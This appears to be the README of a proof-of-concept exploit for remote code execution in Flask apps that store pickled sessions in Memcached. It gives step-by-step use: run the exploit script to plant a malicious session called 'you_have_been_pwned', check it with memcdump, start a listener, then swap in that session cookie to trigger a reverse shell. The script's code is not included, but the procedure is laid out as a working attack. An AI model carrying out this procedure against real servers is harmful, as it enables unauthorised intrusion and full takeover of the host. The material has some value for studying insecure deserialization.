# Flask Memcached RCE
The flask application stored the session value in Memcached using python pickle. It is possible to send a malicious payload to the Memcached daemon using the pickle serialization. 

---
## POC
There is a requiremnt for a python pymemcache modules.
```bash
pip install -r requirements.txt
```
Replace the local and target address and the port number running the memcached service (Default: 11211).

Run the python exploit:
```bash
$python3 flask_mem_pickle.py 
[*]Payload Sent!
[*]NOW RUN 'memcdump --servers= 192.168.235.59' And look for new pwned session.
[*]Then just log into the web server with pwned session and get the shell back.
```
Confirm if the malicious payload is sent:
```bash
$memcdump --servers=192.168.235.59
session:d32d744c-5294-438c-bf20-90885e4fcf78
session:you_have_been_pwned
```
If you see the pwned session the maliciuos payload is sent. To trigger the reverse shell, you need to start a listern and then login in the Flask App and replace the cookie session with ```you_have_been_pwned``` and this will trigger the payload and hopefully you will get the shell back.

